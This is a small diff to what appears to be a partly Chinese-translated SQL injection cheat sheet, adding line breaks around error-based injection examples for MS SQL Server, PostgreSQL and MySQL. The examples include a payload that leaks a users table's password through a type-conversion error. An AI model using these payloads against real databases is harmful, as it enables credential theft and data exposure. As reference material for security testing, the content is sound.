@@ -185,8 +185,10 @@ MySQL:  SELECT IF(YOUR-CONDITION,(SELECT table_name FROM information_schema.tabl
             <pre><code>
 微软: SELECT 'foo' WHERE 1 = (SELECT 'secret')
 > Conversion failed when converting the varchar value 'secret' to data type int.
-PostgreSQL  SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
+
+PostgreSQL:  SELECT CAST((SELECT password FROM users LIMIT 1) AS int)
 > invalid input syntax for integer: "secret"
+
 MySQL:  SELECT 'foo' WHERE 1=1 AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT 'secret')))
 > XPATH syntax error: '\secret'
             </code></pre>
